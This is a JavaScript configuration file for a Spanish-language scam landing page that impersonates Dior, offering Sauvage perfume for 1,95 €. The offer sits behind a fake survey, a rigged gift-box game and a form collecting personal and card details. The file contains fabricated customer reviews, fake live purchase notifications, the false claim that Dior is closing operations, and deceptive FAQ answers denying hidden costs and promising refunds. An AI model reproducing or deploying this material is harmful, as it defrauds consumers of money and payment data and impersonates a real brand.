const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "es";
  const lang = "es-ES";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Tamaño: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "¡Felicidades! ¡Puede participar en la promoción de Dior Sauvage 100 ml!",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    text: "¡Felicidades! <br><br> ¡Puede participar en la promoción de Dior Sauvage 100 ml! <br><br> Dior está vendiendo sus últimos perfumes Sauvage por solo 1,95 € después de cesar sus operaciones en Europa del Este. Gracias a la nueva estrategia de campaña, cada español puede obtener hoy uno de los 1000 perfumes🎁.<br><br> Para recibir un Sauvage de Dior, por favor complete el formulario para confirmar que usted es una persona real. <br><br> ¡Apúrese, el número de artículos en oferta es limitado!",
  };

  const notifications = [
    {
      user: "Beatriz L***",
      location: "Madrid, España",
      action: "¡Acabo de comprar Dior Sauvage 100ml por 1.95€!",
      timeago: "Hace 15 segundos",
    },
    {
      user: "Tracey B***",
      location: "Barcelona, España",
      action: "¡Acabo de comprar Dior Sauvage 100ml por 1.95€!",
      timeago: "Hace 25 segundos",
    },
  ];

  const reviewsArr = [
    {
      name: "Luis",
      time: "Hace 1 día",
      header: "¡Esto es increíble!",
      product: "26468782",
      image: "./assets/proof1.jpg",
      review: "Recientemente escuché sobre esta promoción y decidí comprarla. Gracias Dior por la venta.",
    },
    {
      name: "Antonio",
      time: "Hace 2 días",
      header: "¡Fantástico! Estoy sin palabras.",
      product: "26468789",
      image: "./assets/proof2.jpeg",
      review: "Gracias. El paquete fue entregado muy rápidamente.",
    },
    {
      name: "Josefa",
      time: "Hace 2 días",
      header: "Simplemente genial.",
      product: "26468783",
      image: "./assets/proof3.jpg",
      review: "Mi esposo no quería que participara porque no habíamos oído hablar de esta venta, pero cuando llegó mi paquete, estaba muy emocionado.",
    },
    {
      name: "Miguel",
      time: "Hace 4 días",
      header: "Me encanta.",
      image: "./assets/proof4.jpg",
      review: "Quería estos perfumes desde hace tiempo y finalmente tengo uno.",
    },
    {
      name: "Juan",
      time: "Hace 7 días",
      header: "¡Wow, estoy absolutamente encantado con este producto!",
      product: "26468784",
      image: "./assets/proof5.jpg",
      review: "Increíble. Perfume caro y de calidad por solo 1,95 €. ¡Gracias!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "COMENTARIOS Y OPINIONES",
    percent: "99%",
    rec: "Comentarios sobre esta acción",
  };

  const questions = {
    _of: "Pregunta {1} de {2}: ",
    arr: [
      {
        q: "¿Ha usado alguna vez Dior Sauvage?",
        a: ["Sí", "No"],
      },
      {
        q: "¿Dónde encontró esta frase?",
        a: ["En el sitio web oficial", "Anuncios de Facebook", "Reenviado por un amigo"],
      },
      {
        q: "¿Para qué propósito utilizará un Dior Sauvage?",
        a: ["Para un regalo", "Para uso personal"],
      },
    ],
  };

  const check = {
    title: "Sus respuestas están siendo verificadas.",
    secondTitle: "Cargando...",
    arr: [
      "Ha respondido a la pregunta 3/3",
      "No hay estudios preliminares de su IP.",
      "Los regalos se están cargando...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Felicidades, ha verificado con éxito que es una persona real.",
        button: "OK",
        text: `
      <center>
      Hoy, {date}, tiene la oportunidad de obtener su Dior Sauvage 100ml.
        <br><br>
        Solo tiene que elegir la caja de regalo correcta.
        <br><br>
        ¡Tiene 3 intentos, buena suerte!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Lo sentimos, pero este regalo está vacío. ¡Le quedan 2 intentos más. Buena suerte!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `¡Felicidades! ¡Usted ha ganado!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        ¡Ha ganado el Dior Sauvage 100ml!
        </p>
        <br>
        1) Haga clic en "OK" a continuación para ir a la página de pago de envío.
         <br><br>
        2) Complete el formulario y pague su pedido para recibir su Dior Sauvage.
        <br><br>
        3) El paquete será entregado en 5 a 7 días.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "¿Cuánto tiempo tendré que esperar mi premio?",
      answer: "Por lo general, tarda de 5 a 7 días hábiles.",
    },
    {
      question: "¿Hay costos ocultos?",
      answer: "Absolutamente no. Una vez que haya ganado su premio y haya ingresado sus datos, nos encargaremos del resto. ¡Los costos de envío son nuestra responsabilidad!",
    },
    {
      question: "Soy ganador, ¿por qué debería responder a las preguntas/adivinar la caja?",
      answer: "Todavía no eres un ganador, pero fuiste uno de los 10 seleccionados para intentar ganar nuestro premio...",
    },
    {
      question: "¿Cómo puedo obtener un premio si gano?",
      answer: "Primero, debe ingresar su dirección de envío y datos de contacto, luego nuestro sistema lo dirigirá. Luego debe demostrar que no es un robot, ya que el premio solo se ofrece a personas reales.",
    },
    {
      question: "¿Por qué debería pagar 1,95 € por un premio?",
      answer: "1,95 € no es un precio, es un pago inicial para demostrar que realmente es humano. Todos los pagos serán reembolsados una vez aprobados.",
    },
    {
      question: "¿No puedo usar mi tarjeta de crédito, transacción fallida?",
      answer: "Si no puede usar su tarjeta de crédito, su banco está bloqueando la transacción: necesita verificar su cuenta bancaria.",
    },
  ];

  const cartSteps = {
    personal: {
      title: "Información personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de teléfono",
        },
        email: {
          enabled: true,
          field: "Correo electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de entrega",
        },
        zip: {
          enabled: true,
          field: "Código postal",
        },
      },
    },
    payment: {
      title: "Métodos de pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Resumen de pedido",
      oldPrice: "",
      newPrice: "1,95 €",
      size: "Tamaño",
      subTotal: {
        title: "Valor del pedido",
        amount: "1,95 €",
      },
      delivery: {
        title: "Entrega",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Pague su pedido",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Dior Sauvage 100ml",
      miniImg: "./assets/slide_1.png",

      images: [
        "./assets/slide_1.png",
        "./assets/slide_2.png",
        "./assets/slide_3.jpg",
        "./assets/slide_4.jpg",
      ],
    },
  ];



  const footer = {
    cr: "© 2024 DIOR. All rights reserved.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
